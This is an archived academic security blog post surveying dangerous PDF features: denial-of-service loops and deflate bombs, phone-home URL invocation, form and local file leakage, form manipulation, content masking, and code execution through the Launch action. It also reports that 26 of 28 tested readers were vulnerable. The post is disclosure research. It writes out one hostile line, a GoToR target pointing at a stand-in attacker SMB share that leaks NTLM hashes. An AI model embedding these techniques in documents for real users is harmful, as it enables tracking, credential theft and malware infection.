<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://web-in-security.blogspot.com/2021/01/insecure-features-in-pdfs.html">Original</a>
    <h1>Insecure Features in PDFs (2021)</h1>
    
    <div id="readability-page-1" class="page"><div id="post-body-532055478613066243" itemprop="description articleBody">
<p>In 2019, we published attacks on <a href="https://web-in-security.blogspot.com/2019/02/how-to-spoof-pdf-signatures.html" target="_blank">PDF Signatures</a> and <a href="https://web-in-security.blogspot.com/2019/09/pdfex-major-security-flaws-in-pdf.html" target="_blank">PDF Encryption</a>. During our research and studying the related work, we discovered a lot of blog posts, talks, and papers focusing on malicious PDFs causing some damage. However, there was no systematic analysis of all possible dangerous features supported by PDFs, but only isolated exploits and attack concepts.</p><p>This is a joined work of <a href="https://twitter.com/jensvoid" rel="nofollow" target="_blank">Jens Müller</a>, Dominik Noss, <a href="https://twitter.com/chearix" rel="nofollow" target="_blank">Christian Mainka</a>, <a href="https://twitter.com/v_mladenov">Vladislav Mladenov</a>, and <a href="https://twitter.com/JoergSchwenk" rel="nofollow" target="_blank">Jörg Schwenk</a>.<br/></p><h2>Dangerous Paths: Overview</h2><p>To identify attack vectors, we systematically surveyed which potentially dangerous features exist in the PDF specification. We created a 
comprehensive list with all PDF <i>Actions</i> that can be called. This list contains 18 different actions that we carefully studied.</p><div><p><a href="https://1.bp.blogspot.com/-38jgozuzjf4/YAFJrjq3G4I/AAAAAAAADVo/UWtMM451DFcEKe-4CzQL-CiV1s4KYyVAQCLcBGAsYHQ/s1921/dangerous-paths.png"><img data-original-height="665" data-original-width="1921" height="222" src="https://1.bp.blogspot.com/-38jgozuzjf4/YAFJrjq3G4I/AAAAAAAADVo/UWtMM451DFcEKe-4CzQL-CiV1s4KYyVAQCLcBGAsYHQ/w640-h222/dangerous-paths.png" width="640"/></a></p> </div><div><p>We selected eight actions – the ones that directly or indirectly 
allow access to a file handle and may therefore be abused for dangerous 
features such as URL invocation or writing to files. Having a list of 
security-sensitive actions, we proceeded by investigating all objects 
and related events that can trigger these actions.
</p><p>We identified four PDF objects which allow calling arbitrary actions (<i>Page, Annotation, Field,</i> and <i>Catalog</i>). Most objects offer multiple alternatives for this purpose. For example, the Catalog object, defines the <i>OpenAction</i> or additional actions (<i>AA</i>) events. Each event can launch any sequence of PDF actions, for example, <i>Launch, Thread, etc</i>. <i>JavaScript</i> actions can be embedded within documents. It  opens a new area for attacks, for example, new annotations can be created that can have actions which once again lead to accessing file handles.</p></div><h2 id="dos">Denial of Service</h2><p>The goal of the denial of service class of attacks is enforcing to process PDF applications in consuming all available
 resources (i.e., computing time or memory) or causes them to crash by opening a specially crafted PDF document. We identified two variants: Infinite Loop and Deflate Bomb.</p><div><h4>Infinite Loop</h4><p>This variant induces an endless loop causing the program execution to get stuck. 
The PDF standard allows various elements of the document structure to 
reference to themselves, or to other elements of the same type.</p>
<ul><li><i>Action loop</i>: PDF actions allow to specify a <i>Next</i> action to be performed, thereby resulting in &#34;action cycles&#34;.</li></ul><p><a href="https://1.bp.blogspot.com/-iHu8jBdnH04/YAG88KUnfeI/AAAAAAAADao/sNZo8Ys283IGvlRYvGuHDV8E-8BOIjf7wCLcBGAsYHQ/s2037/dos-actionLoop.png"><img data-original-height="826" data-original-width="2037" src="https://1.bp.blogspot.com/-iHu8jBdnH04/YAG88KUnfeI/AAAAAAAADao/sNZo8Ys283IGvlRYvGuHDV8E-8BOIjf7wCLcBGAsYHQ/s320/dos-actionLoop.png" width="320"/></a></p><ul><li><i>ObjStm loop</i>: Object streams may extend other object streams allows the crafting of a document with cycles.</li></ul></div><p><a href="https://1.bp.blogspot.com/-ICvd9TOvtoY/YAG_qRMO1WI/AAAAAAAADa8/11UzMnr4mkYpTdqJ7gMu0m-JjA0APvmMACLcBGAsYHQ/s1872/dos-objstm.png"><img data-original-height="534" data-original-width="1872" src="https://1.bp.blogspot.com/-ICvd9TOvtoY/YAG_qRMO1WI/AAAAAAAADa8/11UzMnr4mkYpTdqJ7gMu0m-JjA0APvmMACLcBGAsYHQ/s320/dos-objstm.png" width="320"/></a></p><div><ul><li><i>Outline loop</i>: PDF documents may contain an outline. Its entries, however, can refer to themselves or each other.</li></ul><p><a href="https://1.bp.blogspot.com/-2sSMNUAIYtg/YAHAIuyz9CI/AAAAAAAADbI/eDZ1WGxV8UQbKlBcYEcEW23KP-nY_YVogCLcBGAsYHQ/s1640/dos-outlineLoop.png"><img data-original-height="533" data-original-width="1640" src="https://1.bp.blogspot.com/-2sSMNUAIYtg/YAHAIuyz9CI/AAAAAAAADbI/eDZ1WGxV8UQbKlBcYEcEW23KP-nY_YVogCLcBGAsYHQ/s320/dos-outlineLoop.png" width="320"/></a></p><ul><li><i>Calculations</i>: PDF defines &#34;Type 4&#34; calculator functions, 
for example, to transform colors. Processing hard-to-solve mathematical formulas may lead to high demands of CPU.</li></ul><p><a href="https://1.bp.blogspot.com/-jZDJI7YJYck/YAHAPlusOgI/AAAAAAAADbM/fr6m5tZJa28ev1VP_5PjvY92t0788sqSACLcBGAsYHQ/s1305/dos-calculations.png"><img data-original-height="969" data-original-width="1305" src="https://1.bp.blogspot.com/-jZDJI7YJYck/YAHAPlusOgI/AAAAAAAADbM/fr6m5tZJa28ev1VP_5PjvY92t0788sqSACLcBGAsYHQ/s320/dos-calculations.png" width="320"/></a></p><ul><li><i>JavaScript</i>: Finally, in case the PDF application processes scripts within documents, infinite loops can be induced.</li></ul><p><a href="https://1.bp.blogspot.com/-NEAzV38FF84/YAHAWZDm3NI/AAAAAAAADbU/kA2PlJQhAYoHNQzazacYgLfzLNCrpOnfwCLcBGAsYHQ/s1872/dos-javascript.png"><img data-original-height="826" data-original-width="1872" src="https://1.bp.blogspot.com/-NEAzV38FF84/YAHAWZDm3NI/AAAAAAAADbU/kA2PlJQhAYoHNQzazacYgLfzLNCrpOnfwCLcBGAsYHQ/s320/dos-javascript.png" width="320"/></a></p><h4>Deflate Bomb</h4><p>Data amplification attacks based on malicious zip archives are well-known. The first publicly documented DoS attack using a &#34;zip bomb&#34; 
was conducted in 1996 against a Fidonet BBS administrator. However, not only zip files but also stream objects within PDF documents can be compressed using various algorithms such as Deflate to reduce the overall file size. </p><p><a href="https://1.bp.blogspot.com/-QGP3RvLuHxg/YAHAoMAV3BI/AAAAAAAADbk/SfuGuvyeIQsfGbgMOKhlBgUVQY7Xx9SXgCLcBGAsYHQ/s1858/dos-zipBomb.png"><img data-original-height="912" data-original-width="1858" src="https://1.bp.blogspot.com/-QGP3RvLuHxg/YAHAoMAV3BI/AAAAAAAADbk/SfuGuvyeIQsfGbgMOKhlBgUVQY7Xx9SXgCLcBGAsYHQ/s320/dos-zipBomb.png" width="320"/></a></p></div><h2 id="information-disclosure">Information Disclosure</h2><p>The goal of this class of attacks is to track the usage of a document by
 silently invoking a connection to the attacker&#39;s server once the file 
is opened, or to leak PDF document form data, local files, or NTLM 
credentials to the attacker.</p><div><h4>URL Invocation</h4><p>PDF documents that silently &#34;phone home&#34; should be considered as privacy-invasive. They can be used, for example, to deanonymize reviewers, journalists, or activists behind a shared mailbox. The attack&#39;s goal is to open a backchannel to an attacker-controlled server once the PDF file is opened by the victim.</p><p>The possibility of malicious URI resolving in PDF documents has been introduced by Hamon [1] who gave an evaluation for <i>URI</i> and <i>SubmitForm</i> actions in Acrobat Reader. We extend their analysis to all standard PDF features that allow opening a URL, such as <i>ImportData</i>, <i>Launch</i>, <i>GoToR</i>, and <i>JavaScript</i>.</p><p><a href="https://1.bp.blogspot.com/-tccr-bWtIjc/YAHBZIgnyKI/AAAAAAAADbw/HwyFV4aGk5IiPwfr-03JINmAcqd88i8dgCLcBGAsYHQ/s2045/infDisclosure-urlInvocation.png"><img data-original-height="971" data-original-width="2045" src="https://1.bp.blogspot.com/-tccr-bWtIjc/YAHBZIgnyKI/AAAAAAAADbw/HwyFV4aGk5IiPwfr-03JINmAcqd88i8dgCLcBGAsYHQ/s320/infDisclosure-urlInvocation.png" width="320"/></a></p><h4>Form Data Leakage</h4><p>Documents can contain forms to be filled out by the user – a feature 
introduced with PDF version 1.2 in 1996 and used on a daily basis for 
routine offices tasks, such as travel authorization or vacation 
requests. The idea of this attack is as follows: The victim downloads a 
form – a PDF document which contains form fields – from an attacker 
controlled source and fills it out on the screen, for example, in order 
to print it. The form is manipulated by the attacker in such a way that 
it silently send input data to the 
attacker&#39;s server.</p>
 </div>
<h4>Local File Leakage</h4><div><p>The PDF standard defines various methods to embed external files into
 a document or otherwise access files on the host&#39;s file system, as 
documented below.</p>
<ul><li><i>External streams</i>: Documents can contain stream objects (e.g., images) to be included from external files on disk.</li><li><i>Reference XObjects</i>: This feature allows a document to import content from another (external) PDF document.</li><li><i>Open Prepress Interface</i>: Before printing a document, local files can be defined as low-resolution placeholders.</li><li><i>Forms Data Format (FDF)</i>: Interactive form data can be stored in, and auto-imported from, external FDF files.</li><li><i>JavaScript functions</i>: The Adobe JavaScript reference enables documents to read data from or import local files.</li></ul>
<p>If a malicious document managed to firstly read files from the victim’s disk and secondly, send them back to the attacker, such behavior would arguably be critical.</p></div><h4>Credential Theft</h4><div><p>In 1997, Aaron Spangler posted a vulnerability in Windows NT on the Bugtraq mailing list [2]:
 Any client program can trigger a connection to a rogue SMB server. If the server requests authentication, Windows will automatically try to log in with a hash of the user&#39;s credentials. Such captured NTLM hashes allow for efficient offline cracking and can be re-used by applying pass-the-hash or relay attacks to authenticate under the user&#39;s identity. In April 2018, Check Point Research [3] showed that similar attacks can be performed with malicious PDF files. They found that the target of <i>GoToR</i> and <i>GoToE</i> actions can be set to </p><tt>\\attacker.com\dummyfile</tt><p>, thereby leaking credentials in the form of NTLM hashes.</p></div><h2 id="data-manipulation">Data Manipulation</h2><p>This attack class deals with the capabilities of malicious documents to silently modify form data, to write to local files on the host’s file system, or to show a different content based on the application that is used to open the document.</p><div><h4>Form Modification</h4><p>The idea of this attack is as follows: Similar to <i>Form Data Leakage</i> attacks,
 the victim obtains a harmlessly looking PDF document from an attacker 
controlled source, for example, a remittance slip or a tax form. The goal of the attacker is to dynamically, and without knowledge of the 
victim, manipulate form field data.</p>
   
   
   
   
   <h4>File Write Access</h4><p>The PDF standard enables documents to submit form data to external webservers. Technically the webserver’s 
URL is defined using a PDF File Specification. This ambiguity in the standard may be interpreted by implementations in such a way that they enable documents to submit PDF form data to a local file, thereby writing to this file.</p><div><div><p><a href="https://1.bp.blogspot.com/-4RNS3mMraJ4/YAFOi9JoQeI/AAAAAAAADXI/wkX_MJFR_U8Uo7sNMtt_sEkE1_uLBEn4gCLcBGAsYHQ/s659/dataManipulation-FileWriteAccess.png"><img data-original-height="187" data-original-width="659" src="https://1.bp.blogspot.com/-4RNS3mMraJ4/YAFOi9JoQeI/AAAAAAAADXI/wkX_MJFR_U8Uo7sNMtt_sEkE1_uLBEn4gCLcBGAsYHQ/s320/dataManipulation-FileWriteAccess.png" width="320"/></a></p></div></div><h4>Content Masking </h4><div><p>The goal of this attack is to craft a document that renders 
differently, depending on the applied PDF interpreter. This can be used,
 for example, to show different content to different reviewers, to trick
 content filters (AI-based machines as well as human content 
moderators), plagiarism detection software, or search engines, which 
index a different text than the one shown to users when opening the 
document.</p>
<ul><li><i>Stream confusion</i>: It is unclear how content streams are parsed if their <i>Length</i> value does not match the offset of the endstream marker, or if syntax errors are introduced.</li><li><i>Object confusion</i>: An object can overlay another object. The second object may not be processed if it has a duplicate object number,
 if it is not listed in the <i>XRef</i> table, or if other structural syntax errors are introduced.</li><li><i>Document confusion</i>: A PDF file can contain yet another document (e.g., as embedded file), multiple <i>XRef</i> tables, etc., which results in ambiguities on the structural level.</li><li><i>PDF confusion</i>: Objects before the PDF header or after an <i>EOF</i> marker may be processed by implementations, introducing ambiguities in the outer document structure.</li></ul></div></div><h2 id="code-execution">Code Execution</h2><p>The goal of this attack is to execute attacker-controlled code. This can be achieved by silently launching an executable file, embedded within the document, to infect the host with malware. The PDF specification defines the Launch action, which allows documents to launch arbitrary applications. The file to be launched can either be specified by a local path, a network share, a URL, or a file embedded within the PDF 
document itself.</p><p><a href="https://1.bp.blogspot.com/-WS3ZFTydKQE/YAHLHsZAYOI/AAAAAAAADd0/dcUFo5FdyIc9Snw5Ywxm3tSaHfojWImawCLcBGAsYHQ/s1244/codeExecution.png"><img data-original-height="599" data-original-width="1244" src="https://1.bp.blogspot.com/-WS3ZFTydKQE/YAHLHsZAYOI/AAAAAAAADd0/dcUFo5FdyIc9Snw5Ywxm3tSaHfojWImawCLcBGAsYHQ/s320/codeExecution.png" width="320"/></a></p><h2>Evaluation</h2><p>Out of 28 tested applications, 26 are vulnerable to at least one attack.</p><p><a href="https://1.bp.blogspot.com/-h-Gxv17XEvA/YAHNLNlknwI/AAAAAAAADeI/-A60paGx1mQwgvLlZGT6hWuGRbE1nLIIACLcBGAsYHQ/s1612/evaluation.png"><img data-original-height="1204" data-original-width="1612" height="478" src="https://1.bp.blogspot.com/-h-Gxv17XEvA/YAHNLNlknwI/AAAAAAAADeI/-A60paGx1mQwgvLlZGT6hWuGRbE1nLIIACLcBGAsYHQ/w640-h478/evaluation.png" width="640"/></a></p><h2>Authors of this Post<br/></h2><h2>Sources</h2></div></div>
  </body>
</html>
